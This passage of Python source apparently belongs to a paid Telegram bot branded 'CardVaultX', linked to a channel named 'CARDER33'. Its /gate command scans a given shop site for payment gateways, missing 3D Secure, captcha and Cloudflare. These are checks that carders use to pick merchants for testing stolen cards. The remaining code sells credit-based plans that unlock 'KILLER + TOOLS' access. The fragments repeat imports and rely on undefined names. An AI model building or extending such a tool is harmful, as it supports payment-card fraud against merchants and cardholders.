    'Joomla': r'media/system/js|joomla\.javascript/',
    'Drupal': r'sites/default/files|drupal\.settings\.js/',
    'TYPO3': r'typo3temp|typo3/',
    'Concrete5': r'concrete/js|concrete5/',
    'Umbraco': r'umbraco/|umbraco\.config/',
    'Sitecore': r'sitecore/content|sitecore\.js/',
    'Kentico': r'cms/getresource\.ashx|kentico\.js/',
    'Episerver': r'episerver/|episerver\.js/',
    'Custom CMS': r'(?:<meta name="generator" content="([^"]+)")'
}

# Security patterns
SECURITY_PATTERNS = {
    '3D Secure': r'3d_secure|threed_secure|secure_redirect',
}

# Example list of gateways (add your own)
PAYMENT_GATEWAYS = [
    # Major Global & Popular Gateways
    "PayPal", "Stripe", "Braintree", "Square", "Cybersource", "lemon-squeezy",
    "Authorize.Net", "2Checkout", "Adyen", "Worldpay", "SagePay",
    "Checkout.com", "Bolt", "Eway", "PayFlow", "Payeezy",
    "Paddle", "Mollie", "Viva Wallet", "Rocketgateway", "Rocketgate",
    "Rocket", "Auth.net", "Authnet", "rocketgate.com", "Recurly",

    # E-commerce Platforms
    "Shopify", "WooCommerce", "BigCommerce", "Magento", "Magento Payments",
    "OpenCart", "PrestaShop", "3DCart", "Ecwid", "Shift4Shop",
    "Shopware", "VirtueMart", "CS-Cart", "X-Cart", "LemonStand",

    # Additional Payment Solutions
    "Convergepay", "PaySimple", "oceanpayments", "eProcessing",
    "hipay", "cybersourse", "payjunction", "usaepay", "creo",
    "SquareUp", "ebizcharge", "cpay", "Moneris", "cardknox",
    "matt sorra", "Chargify", "Paytrace", "hostedpayments", "securepay",
    "blackbaud", "LawPay", "clover", "cardconnect", "bluepay",
    "fluidpay", "Ebiz", "chasepaymentech", "Auruspay", "sagepayments",
    "paycomet", "geomerchant", "realexpayments", "Razorpay",

    # Digital Wallets & Payment Apps
    "Apple Pay", "Google Pay", "Samsung Pay",  "Cash App",
    "Revolut", "Zelle", "Alipay", "WeChat Pay", "PayPay", "Line Pay",
    "Skrill", "Neteller", "WebMoney", "Payoneer", "Paysafe",
    "Payeer", "GrabPay", "PayMaya", "MoMo", "TrueMoney",
    "Touch n Go", "GoPay", "JKOPay", "EasyPaisa",

    # Regional & Country Specific
    "Paytm", "UPI", "PayU", "CCAvenue",
    "Mercado Pago", "PagSeguro", "Yandex.Checkout", "PayFort", "MyFatoorah",
    "Kushki", "RuPay", "BharatPe", "Midtrans", "MOLPay",
    "iPay88", "KakaoPay", "Toss Payments", "NaverPay",
    "Bizum", "Culqi", "Pagar.me", "Rapyd", "PayKun", "Instamojo",
    "PhonePe", "BharatQR", "Freecharge", "Mobikwik", "BillDesk",
    "Citrus Pay", "RazorpayX", "Cashfree", "PayUbiz", 

    # Buy Now Pay Later
    "Klarna", "Affirm", "Afterpay",
    "Splitit", "Perpay", "Quadpay", "Laybuy", "Openpay",
    "Cashalo", "Hoolah", "Pine Labs", "ChargeAfter",

    # Cryptocurrency
    "BitPay", "Coinbase Commerce", "CoinGate", "CoinPayments", "Crypto.com Pay",
    "BTCPay Server", "NOWPayments", "OpenNode", "Utrust", "MoonPay",
    "Binance Pay", "CoinsPaid", "BitGo", "Flexa", 

    # Enterprise Solutions
    "ACI Worldwide", "Bank of America Merchant Services",
    "JP Morgan Payment Services", "Wells Fargo Payment Solutions",
    "Deutsche Bank Payments", "Barclaycard", "American Express Payment Gateway",
    "Discover Network", "UnionPay", "JCB Payment Gateway",


]

from urllib.parse import urlparse
import re
import aiohttp
import asyncio
from telegram import Update
from telegram.ext import ContextTypes
from telegram.helpers import escape_markdown
from db import get_user, update_user

BULLET_GROUP_LINK = "https://t.me/CARDER33"

# --- Shared aiohttp session ---
session: aiohttp.ClientSession = None

async def init_session():
    global session
    if session is None or session.closed:
        session = aiohttp.ClientSession()

async def close_session():
    global session
    if session and not session.closed:
        await session.close()

# --- Credit consumption ---
async def consume_credit(user_id: int) -> bool:
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        await update_user(user_id, credits=user_data["credits"] - 1)
        return True
    return False

# --- Fetch site ---
async def fetch_site(url: str):
    await init_session()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    domain = urlparse(url).netloc

    headers = {
        "authority": domain,
        "scheme": "https",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "max-age=0",
        "sec-ch-ua": '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/140.0.0.0 Mobile Safari/537.36",
    }

    try:
        async with session.get(url, headers=headers, timeout=15) as resp:
            text = await resp.text()
            return resp.status, text, resp.headers
    except Exception:
        return None, None, None

# --- Detection functions ---
def detect_cms(html: str):
    for cms, pattern in CMS_PATTERNS.items():
        if re.search(pattern, html, re.IGNORECASE):
            return cms
    return "Unknown"

def detect_security(html: str):
    patterns_3ds = [r'3ds', r'verify', r'authentication', r'dsv', r'securecode', r'pareq', r'acs']
    for pattern in patterns_3ds:
        if re.search(pattern, html, re.IGNORECASE):
            return "3D Secure Detected ✅"
    return "2D (No 3D Secure Found ❌)"

def detect_gateways(html: str):
    detected = [g for g in PAYMENT_GATEWAYS if re.search(g, html, re.IGNORECASE)]
    return ", ".join(detected) if detected else "None Detected"

def detect_captcha(html: str):
    html_lower = html.lower()
    if "hcaptcha" in html_lower:
        return "hCaptcha Detected ✅"
    elif "recaptcha" in html_lower or "g-recaptcha" in html_lower:
        return "reCAPTCHA Detected ✅"
    elif "captcha" in html_lower:
        return "Generic Captcha Detected ✅"
    return "No Captcha Detected"

def detect_cloudflare(html: str, headers=None):
    cf_markers = ["cloudflare", "cf-browser-verification", "attention required! | cloudflare"]
    if headers:
        cf_headers = ["cf-ray", "server"]
        if any(h.lower() in headers for h in cf_headers):
            return "Cloudflare Detected ✅"
    if any(marker.lower() in html.lower() for marker in cf_markers):
        return "Cloudflare Detected ✅"
    return "None"

# --- Worker for background scanning ---
async def gate_worker(update: Update, url: str, msg, user_id: int):
    if not await consume_credit(user_id):
        await msg.edit_text(
            escape_markdown("❌ You don't have enough credits to perform this scan.", version=2),
            parse_mode="MarkdownV2",
            disable_web_page_preview=True
        )
        return

    # small delay for realism & yielding
    await asyncio.sleep(0)

    status, html, headers = await fetch_site(url)
    await asyncio.sleep(0)  # yield after fetch

    if not html:
        await msg.edit_text(
            escape_markdown(f"❌ Cannot access {url}", version=2),
            parse_mode="MarkdownV2",
            disable_web_page_preview=True
        )
        return

    cms = detect_cms(html)
    await asyncio.sleep(0)
    security = detect_security(html)
    await asyncio.sleep(0)
    gateways = detect_gateways(html)
    await asyncio.sleep(0)
    captcha = detect_captcha(html)
    await asyncio.sleep(0)
    cloudflare = detect_cloudflare(html, headers=headers)
    await asyncio.sleep(0)

    user = update.effective_user
    requester_clickable = f"[{escape_markdown(user.first_name, version=2)}](tg://user?id={user.id})"
    developer_clickable = "[kคli liຖนxx](https://t.me/Kalinuxxx)"
    bullet = "[⌇]"
    bullet_link = f"[{escape_markdown(bullet, version=2)}]({BULLET_GROUP_LINK})"

    results = (
        f"◇━━〔 𝑳𝒐𝒐𝒌𝒖𝒑 𝑹𝒆𝒔𝒖𝒍𝒕𝒔 〕━━◇\n"
        f"{bullet_link} 𝐒𝐢𝐭𝐞 ➵ `{escape_markdown(url, version=2)}`\n"
        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬 ➵ _{escape_markdown(gateways, version=2)}_\n"
        f"{bullet_link} 𝐂𝐌𝐒 ➵ `{escape_markdown(cms, version=2)}`\n"
        f"――――――――――――――――\n"
        f"{bullet_link} 𝐂𝐚𝐩𝐭𝐜𝐡𝐚 ➵ `{escape_markdown(captcha, version=2)}`\n"
        f"{bullet_link} 𝐂𝐥𝐨𝐮𝐝𝐟𝐥𝐚𝐫𝐞 ➵ `{escape_markdown(cloudflare, version=2)}`\n"
        f"{bullet_link} 𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 ➵ `{escape_markdown(security, version=2)}`\n"
        f"――――――――――――――――\n"
        f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➵ {requester_clickable}\n"
        f"{bullet_link} 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➵ {developer_clickable}"
    )

    await msg.edit_text(results, parse_mode="MarkdownV2", disable_web_page_preview=True)

# --- /gate command ---
async def gate_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /gate <site_url>")
        return

    url = context.args[0]
    user_id = update.effective_user.id

    # Processing message
    status_text = escape_markdown("𝗦𝘁𝗮𝘁𝘂𝘀 ➵ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 🔎...", version=2)
    bullet = "[⌇]"
    bullet_link = f"[{escape_markdown(bullet, version=2)}]({BULLET_GROUP_LINK})"
    processing_text = f"```𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳```\n{bullet_link} {status_text}\n"

    msg = await update.message.reply_text(
        processing_text,
        parse_mode="MarkdownV2",
        disable_web_page_preview=True
    )

    # Launch worker in background (non-blocking)
    asyncio.create_task(gate_worker(update, url, msg, user_id))




import psutil
import platform
import socket
from datetime import datetime
import time
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Clickable bullet
BULLET_LINK = '<a href="https://t.me/CARDER33">[⌇]</a>'

async def get_total_users():
    from db import get_all_users
    users = await get_all_users()
    return len(users)

def get_uptime() -> str:
    boot_time = psutil.boot_time()
    uptime_seconds = int(time.time() - boot_time)
    days, remainder = divmod(uptime_seconds, 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours:02}:{minutes:02}:{seconds:02}"

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # CPU info
    cpu_usage = psutil.cpu_percent(interval=1)
    cpu_count = psutil.cpu_count(logical=True)
    cpu_model = platform.processor() or "N/A"

    # RAM info
    memory = psutil.virtual_memory()
    total_memory = memory.total / (1024 ** 3)  # GB
    used_memory = memory.used / (1024 ** 3)
    available_memory = memory.available / (1024 ** 3)
    memory_percent = memory.percent

    # Swap info
    swap = psutil.swap_memory()
    total_swap = swap.total / (1024 ** 3)
    used_swap = swap.used / (1024 ** 3)
    swap_percent = swap.percent

    # Disk info
    disk = psutil.disk_usage("/")
    total_disk = disk.total / (1024 ** 3)  # GB
    used_disk = disk.used / (1024 ** 3)
    free_disk = disk.free / (1024 ** 3)
    disk_percent = disk.percent

    # Host/VPS info
    hostname = socket.gethostname()
    os_name = platform.system()
    os_version = platform.version()
    architecture = platform.machine()

    # Uptime
    uptime_str = get_uptime()

    # Current time
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Total users
    total_users = await get_total_users()

    # Final message
    status_message = (
        f"✦━━━[ 𝐁𝐨𝐭 & 𝐕𝐏𝐒 𝐒𝐭𝐚𝐭𝐮𝐬 ]━━━✦\n"
        f"{BULLET_LINK} 𝐒𝐭𝐚𝐭𝐮𝐬 ➳ <code>Active ✅</code>\n"
        f"{BULLET_LINK} 𝐒𝐲𝐬𝐭𝐞𝐦 ➳ <code>{os_name} {os_version}</code>\n"
        f"{BULLET_LINK} 𝐀𝐫𝐜𝐡𝐢𝐭𝐞𝐜𝐭𝐮𝐫𝐞 ➳ <code>{architecture}</code>\n"
        "――――――――――――――――\n"
        f"{BULLET_LINK} 𝐂𝐏𝐔 ➳ <code>{cpu_usage:.1f}% ({cpu_count} cores)</code>\n"
        f"{BULLET_LINK} 𝐑𝐀𝐌 ➳ <code>{used_memory:.2f}GB / {total_memory:.2f}GB ({memory_percent:.1f}%)</code>\n"
        f"{BULLET_LINK} 𝐑𝐀𝐌 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 ➳ <code>{available_memory:.2f}GB</code>\n"
        f"{BULLET_LINK} 𝐃𝐢𝐬𝐤 ➳ <code>{used_disk:.2f}GB / {total_disk:.2f}GB ({disk_percent:.1f}%)</code>\n"
        f"{BULLET_LINK} 𝐃𝐢𝐬𝐤 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 ➳ <code>{free_disk:.2f}GB</code>\n"
        "――――――――――――――――\n"
        f"{BULLET_LINK} 𝐓𝐨𝐭𝐚𝐥 𝐔𝐬𝐞𝐫𝐬 ➳ <code>{total_users}</code>\n"
        f"{BULLET_LINK} 𝐔𝐩𝐭𝐢𝐦𝐞 ➳ <code>{uptime_str}</code>\n"
        f"{BULLET_LINK} 𝐓𝐢𝐦𝐞 ➳ <code>{current_time}</code>\n"
        f"{BULLET_LINK} 𝐁𝐨𝐭 𝐁𝐲 ➳ <a href='tg://resolve?domain=Kalinuxxx'>kคli liຖนxx</a>\n"
        "――――――――――――――――"
    )

    await update.effective_message.reply_text(
        status_message,
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True
    )




# === OWNER-ONLY COMMANDS ===
import re
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

from config import AUTHORIZED_CHATS
from db import get_all_users  # Ensure this exists in db.py

def escape_markdown_v2(text: str) -> str:
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shows all admin commands, authorized groups, and private plan users."""

    admin_commands_list = (
        "• `/give_starter <user_id>`: Give 7\\-day Starter Plan\n"
        "• `/give_premium <user_id>`: Give 30\\-day Premium Plan\n"
        "• `/give_plus <user_id>`: Give 60\\-day Plus Plan\n"
        "• `/give_custom <user_id>`: Give Custom Plan\n"
        "• `/take_plan <user_id>`: Remove plan & private access\n"
        "• `/au <chat_id>`: Authorize a group\n"
        "• `/rauth <user_id>`: Remove private user auth\n"
        "• `/gen_codes`: Generate 10 Starter Plan codes"
    )

    # Authorized Groups
    authorized_groups_list = []
    for chat_id in AUTHORIZED_CHATS:
        try:
            chat = await context.bot.get_chat(chat_id)
            name = escape_markdown_v2(chat.title or "N/A")
        except Exception:
            name = "Unknown or Left Group"
        escaped_id = escape_markdown_v2(str(chat_id))
        authorized_groups_list.append(f"• `{escaped_id}` → *{name}*")
    authorized_groups_str = (
        "\n".join(authorized_groups_list) if authorized_groups_list else "_No groups authorized\\._"
    )

    # Private plan users
    users = await get_all_users()
    plan_users = []
    for user in users:
        plan = user.get("plan", "Free")
        if plan.lower() not in ["free", "n/a"]:
            uid = escape_markdown_v2(str(user["id"]))
            plan_escaped = escape_markdown_v2(plan)
            plan_users.append(f"• ID: `{uid}` \\| Plan: `{plan_escaped}`")
    authorized_users_str = (
        "\n".join(plan_users) if plan_users else "_No private users with plans\\._"
    )

    admin_dashboard_message = (
        "╭━━━━━『 𝐀𝐃𝐌𝐈𝐍 𝐃𝐀𝐒𝐇𝐁𝐎𝐀𝐑𝐃 』━━━━━╮\n"
        "┣ 🤖 *Owner Commands:*\n"
        f"{admin_commands_list}\n"
        "╭━━━『 𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐆𝐫𝐨𝐮𝐩𝐬 』━━━╮\n"
        f"{authorized_groups_str}\n"
        "╭━━━『 𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐔𝐬𝐞𝐫𝐬 \\(Private Plans\\) 』━━━╮\n"
        f"{authorized_users_str}"
    )

    await update.effective_message.reply_text(
        admin_dashboard_message,
        parse_mode=ParseMode.MARKDOWN_V2
    )



async def _update_user_plan(user_id: int, plan_name: str, credits: int, duration_days: int = None):
    """Updates user's subscription plan and expiry."""
    plan_expiry = 'N/A'
    if duration_days:
        expiry_date = datetime.now() + timedelta(days=duration_days)
        plan_expiry = expiry_date.strftime('%d-%m-%Y')

    await update_user(
        user_id,
        plan=plan_name,
        status=plan_name,
        credits=credits,
        plan_expiry=plan_expiry
    )

    AUTHORIZED_PRIVATE_USERS.add(user_id)

    # Re-fetch updated user data if needed
    user_data = await get_user(user_id)
    return user_data


from datetime import datetime, timedelta
from telegram.constants import ParseMode

PLAN_DEFINITIONS = {
    "starter": {"name": "Starter Plan", "credits": 300, "days": 7},
    "premium": {"name": "Premium Plan", "credits": 1000, "days": 30},
    "plus": {"name": "Plus Plan", "credits": 2000, "days": 60},
    "custom": {"name": "Custom Plan", "credits": 3000, "days": None},
}

def escape_markdown_v2(text: str) -> str:
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))


from datetime import datetime

async def give_starter(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/give_starter [user_id]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    user_id = int(context.args[0])
    await _update_user_plan(user_id, 'Starter Plan', 300, 7)
    await update.effective_message.reply_text(
        f"✅ Starter Plan activated for user `{user_id}`\\.",
        parse_mode=ParseMode.MARKDOWN_V2
    )

    # Fetch user info and send congratulation
    try:
        chat = await context.bot.get_chat(user_id)
        first_name = chat.first_name or "Warrior"
    except Exception:
        first_name = "Warrior"

    date_str = datetime.now().strftime('%d %B %Y')
    congrats_text = generate_congrats_box(user_id, "Starter", "KILLER + TOOLS", date_str, first_name)

    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=congrats_text,
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        await update.effective_message.reply_text(f"⚠️ Failed to send congratulatory message to user `{user_id}`\\.\nError: `{e}`", parse_mode=ParseMode.MARKDOWN_V2)

from datetime import datetime

async def give_premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/give_premium [user_id]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    user_id = int(context.args[0])
    await _update_user_plan(user_id, 'Premium Plan', 1000, 30)
    await update.effective_message.reply_text(
        f"✅ Premium Plan activated for user `{user_id}`\\.",
        parse_mode=ParseMode.MARKDOWN_V2
    )

    # Fetch user details
    try:
        chat = await context.bot.get_chat(user_id)
        first_name = chat.first_name or "Warrior"
    except Exception:
        first_name = "Warrior"

    date_str = datetime.now().strftime('%d %B %Y')
    congrats_text = generate_congrats_box(user_id, "Premium", "KILLER + TOOLS", date_str, first_name)

    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=congrats_text,
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        await update.effective_message.reply_text(
            f"⚠️ Failed to send congratulatory message to user `{user_id}`\\.\nError: `{e}`",
            parse_mode=ParseMode.MARKDOWN_V2
        )


from datetime import datetime

async def give_plus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/give_plus [user_id]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    user_id = int(context.args[0])
    await _update_user_plan(user_id, 'Plus Plan', 2000, 60)

    await update.effective_message.reply_text(
        f"✅ Plus Plan activated for user `{user_id}`\\.",
        parse_mode=ParseMode.MARKDOWN_V2
    )

    # Fetch user's name
    try:
        chat = await context.bot.get_chat(user_id)
        first_name = chat.first_name or "Warrior"
    except Exception:
        first_name = "Warrior"

    # Create and send congratulations box
    date_str = datetime.now().strftime('%d %B %Y')
    congrats_text = generate_congrats_box(user_id, "Plus", "KILLER + TOOLS", date_str, first_name)

    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=congrats_text,
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        await update.effective_message.reply_text(
            f"⚠️ Failed to send congratulatory message to user `{user_id}`\\.\nError: `{e}`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

from datetime import datetime

async def give_custom(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/give_custom [user_id]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    user_id = int(context.args[0])
    await _update_user_plan(user_id, 'Custom Plan', 3000)

    await update.effective_message.reply_text(
        f"✅ Custom Plan activated for user `{user_id}` with 3000 credits\\.",
        parse_mode=ParseMode.MARKDOWN_V2
    )

    # Get first name for congrats message
    try:
        chat = await context.bot.get_chat(user_id)
        first_name = chat.first_name or "Warrior"
    except Exception:
        first_name = "Warrior"

    # Generate & send congratulatory message
    date_str = datetime.now().strftime('%d %B %Y')
    congrats_text = generate_congrats_box(
        user_id=user_id,
        plan="Custom",
        access_level="KILLER + TOOLS",
        date=date_str,
        first_name=first_name
    )

    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=congrats_text,
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        await update.effective_message.reply_text(
            f"⚠️ Failed to send congratulatory message to user `{user_id}`\\.\nError: `{e}`",
            parse_mode=ParseMode.MARKDOWN_V2
        )


async def take_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Removes a user's current plan and revokes private access."""
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text("❌ Invalid format\\. Usage: `/take_plan [user_id]`", parse_mode=ParseMode.MARKDOWN_V2)
    
    try:
        user_id = int(context.args[0])
        user_data = await get_user(user_id)  # ✅ FIXED: was `user.id` before (wrong variable)
        
        # Reset plan and credits
        user_data['plan'] = 'Free'
        user_data['status'] = 'Free'
        user_data['plan_expiry'] = 'N/A'
        user_data['credits'] = DEFAULT_FREE_CREDITS
        
        # Persist the update
        await update_user(
            user_id,
            plan='Free',
            status='Free',
            plan_expiry='N/A',
            credits=DEFAULT_FREE_CREDITS
        )

        # Remove from private authorized users
        AUTHORIZED_PRIVATE_USERS.discard(user_id)

        await update.effective_message.reply_text(
            f"✅ Plan and private access have been removed for user `{user_id}`\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    except ValueError:
        return await update.effective_message.reply_text(
            "❌ Invalid user ID format\\. Please provide a valid integer user ID\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )


def generate_congrats_box(user_id: int, plan: str, access_level: str, date: str, first_name: str) -> str:
    from telegram.helpers import escape_markdown
    return (
        f"╭━━━[ 🎉 𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐬, {escape_markdown(first_name, version=2)}\\! ]━━━╮\n"
        f"┃\n"
        f"┃ ✨ *Access to* ⚡ `𝓒𝓪𝓻𝓭𝓥𝓪𝓾𝓵𝓽𝑿` *has been granted\\.*\n"
        f"┃\n"
        f"┃ 🆔 *𝙄𝘿*             : `{user_id}`\n"
        f"┃ 💎 *𝙋𝙡𝙖𝙣*           : `{plan}`\n"
        f"┃ 🧰 *𝘼𝙘𝙘𝙚𝙨𝙨 𝙇𝙚𝙫𝙚𝙡*   : `{access_level}`\n"
        f"┃ 📅 *𝘿𝙖𝙩𝙚*           : `{date}`\n"
        f"┃ 🔓 *𝙎𝙩𝙖𝙩𝙪𝙨*         : `✔ Activated`\n"
        f"┃\n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━━╯\n"
        f"\n"
        f"💠 *𝕎𝕖𝕝𝕔𝕠𝕞𝕖 𝕥𝕠 𝓒𝓪𝓻𝓭𝓥𝓪𝓾𝓵𝓽𝓧* — 𝙉𝙤 𝙡𝙞𝙢𝙞𝙩𝙨 𝙅𝙪𝙨𝙩 𝙥𝙤𝙬𝙚𝙧\\.\n"
        f"𝙔𝙤𝙪’𝙧𝙚 𝙣𝙤𝙬 𝙖 𝙥𝙧𝙤𝙪𝙙 𝙢𝙚𝙢𝙗𝙚𝙧 𝙤𝙛 𝙩𝙝𝙚 *𝗘𝗹𝗶𝘁𝗲 {escape_markdown(plan, version=2)} 𝗧𝗶𝗲𝗿*\\.\n"
        f"\n"
        f"🍷 *𝓣𝓱𝓪𝓷𝓴𝓼 𝓯𝓸𝓻 𝓬𝓱𝓸𝓸𝓼𝓲𝓷𝓰 𝓒𝓪𝓻𝓭𝓥𝓪𝓾𝓵𝓽𝓧\\!* 𝙔𝙤𝙪𝙧 𝙖𝙘𝙘𝙚𝙨𝙨 𝙞𝙨 𝙣𝙤𝙬 𝙤𝙥𝙚𝙣\\."
    )


async def auth_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Authorizes a group to use the bot."""
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].strip('-').isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/au [chat_id]`", 
            parse_mode=ParseMode.MARKDOWN_V2
        )
    
    try:
        chat_id = int(context.args[0])
        if chat_id > 0:
            return await update.effective_message.reply_text(
                "❌ That is not a group chat ID\\. Make sure you provide a valid group chat ID that starts with `-`\\.", 
                parse_mode=ParseMode.MARKDOWN_V2
            )

        AUTHORIZED_CHATS.add(chat_id)
        await update.effective_message.reply_text(
            f"✅ Group with chat ID `{chat_id}` has been authorized\\.", 
            parse_mode=ParseMode.MARKDOWN_V2
        )

    except ValueError:
        return await update.effective_message.reply_text(
            "❌ Invalid chat ID format\\. Please provide a valid integer chat ID\\.", 
            parse_mode=ParseMode.MARKDOWN_V2
        )


import os
import asyncpg
from telegram import Update
from telegram.ext import ContextTypes

ADMIN_USER_ID = 6701573974  # Replace with your admin user ID

async def reset_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return

    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("⚠️ Usage: /reset <amount_of_credits>\nExample: /reset 500")
        return

    new_credits = int(context.args[0])
    database_url = os.getenv("DATABASE_URL")
    if not database_url:
        await update.message.reply_text("❌ DATABASE_URL environment variable not set.")
        return

    try:
        conn = await asyncpg.connect(dsn=database_url)
        await conn.execute("UPDATE users SET credits = $1", new_credits)
        await conn.close()
    except Exception as e:
        await update.message.reply_text(f"❌ Database error: {e}")
        return

    await update.message.reply_text(f"✅ All user credits have been reset to {new_credits}.")


async def remove_authorize_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Removes a user's private access and resets their plan."""
    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/rauth [user_id]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    try:
        user_id = int(context.args[0])

        if user_id in AUTHORIZED_PRIVATE_USERS:
            AUTHORIZED_PRIVATE_USERS.remove(user_id)

            # Update the user in the database
            await update_user(
                user_id,
                plan='Free',
                status='Free',
                credits=DEFAULT_FREE_CREDITS,
                plan_expiry='N/A'
            )

            await update.effective_message.reply_text(
                f"✅ User `{user_id}` has been de-authorized and plan reset to Free\\.",
                parse_mode=ParseMode.MARKDOWN_V2
            )
        else:
            await update.effective_message.reply_text(
                f"ℹ️ User `{user_id}` was not in the authorized private list\\.",
                parse_mode=ParseMode.MARKDOWN_V2
            )
    except ValueError:
        return await update.effective_message.reply_text(
            "❌ Invalid user ID format\\. Please provide a valid integer user ID\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

import re
import uuid
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Global redeem code storage (if not already defined)
REDEEM_CODES = {}

# Escape function for MarkdownV2
def escape_markdown_v2(text: str) -> str:
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', text)

async def gen_codes_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generates 10 redeem codes for the Starter Plan."""
    generated_codes = []
    for _ in range(10):
        code = str(uuid.uuid4()).replace('-', '')[:12].upper()
        REDEEM_CODES[code] = {
            'plan_name': 'Starter Plan',
            'credits': 300,
            'duration_days': 7
        }
        generated_codes.append(code)

    code_list_text = "\n".join([f"`{escape_markdown_v2(code)}`" for code in generated_codes])

    response_text = (
        "✅ *10 new redeem codes for the Starter Plan have been generated:* \n\n"
        f"{code_list_text}\n\n"
        "These codes are one\\-time use\\. Share them wisely\\."
    )

    await update.effective_message.reply_text(response_text, parse_mode=ParseMode.MARKDOWN_V2)

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Redeems a code to activate a plan."""
    user = update.effective_user
    user_id = user.id

    if not context.args or len(context.args) != 1:
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/redeem [code]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    code = context.args[0].upper()
    plan_details = REDEEM_CODES.get(code)

    if not plan_details:
        return await update.effective_message.reply_text(
            "❌ Invalid or already used code\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

